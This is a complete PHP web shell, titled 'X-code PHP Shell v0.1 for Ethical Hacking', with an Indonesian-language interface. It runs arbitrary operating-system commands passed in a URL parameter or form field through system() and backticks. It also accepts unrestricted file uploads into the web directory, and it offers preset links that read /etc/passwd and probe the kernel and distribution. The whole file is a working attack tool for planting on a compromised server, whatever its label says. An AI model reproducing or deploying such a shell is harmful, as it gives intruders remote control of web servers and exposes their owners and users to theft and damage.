<html>
<head>
<title>X-code PHP Shell</title>
<style type="text/css">
.style1 {font-size: 36px}
body {
background-color: #333366;
}
.style2 {font-size: 16px; }
</style></head>

<body>
<table width="800" height="342" border="1" align="center" cellpadding="0" cellspacing="0">
<tr>
<td height="100" align="center" bgcolor="#999999"><div align="center">
<p class="style1">X-code PHP Shell v0.1 for Ethical Hacking </p>
</div>
<p class="style2">Oleh Kurniawan - <a href="http://xcode.or.id" target="_blank">xcode.or.id</a> </p>
<p class="style2"><a href="?">Home</a> &#8226; <a href="?shell">Shell</a> &#8226; <a href="?inject">Upload</a> &#8226; <a href="?cmd=uname -a">Cek kernel</a> &#8226; <a href="?cmd=lsb_release -a">Cek Distro linux</a> &#8226; <a href="?cmd=php -v">Cek versi PHP</a> &#8226; <a href="?cmd=lscpu">Cek CPU</a> &#8226; <a href="?cmd=free">Cek RAM</a> &#8226; <a href="?cmd=cat /etc/passwd">Cek User linux</a></p>
<p class="style2"><br />
</p></td>
</tr>
<tr>
<td height="101" bgcolor="#CCCCCC">
<table width="700" border="0" align="center" cellpadding="0" cellspacing="0">
<tr>
<td>
<center>
<p>X-code PHP Shell<br />
</p>
<center>	
<? $cmd = $_GET["cmd"]; if (!empty($cmd)) { echo
"<pre>"; system($cmd); echo "</pre>"; exit; } ?>
<?php 
if(isset($_GET['inject']))
{ 
if(isset($_POST['cekfile']))
{
move_uploaded_file($_FILES["file"]["tmp_name"],"".$_FILES["file"]["name"]);
echo "Upload berhasil";
}
else
{
echo '<form enctype="multipart/form-data" action="" method="post">
Nama file : <input type="file" name="file" />
<br /><input name="cekfile" type="submit" value="Upload"></form>';
 } 
 }
?>
<?php 
if(isset($_GET['shell']))
{ 
if(isset($_POST['x']))
{
?>
<?php
echo 'Jika ingin ke folder lain misal /home maka bisa ketik ls -l /home <br /> <br /><form action="" method="POST">
<input type="text" name="x" value="ls -l">
<input type="submit" value="Execute">
</form>';?>
<pre>
<? echo `{$_POST['x']};` ?> </pre> <? die(); ?></center>
<?php 
}
else
{
echo 'Jika ingin ke folder lain misal /home maka bisa ketik ls -l /home <br /> <br /><form action="" method="POST">
<input type="text" name="x" value="ls -l">
<input type="submit" value="Execute">
    </form>';
 } 
 }
?>
</center></td>
</tr>
</table>  </tr>
</table>
</body>
</html>
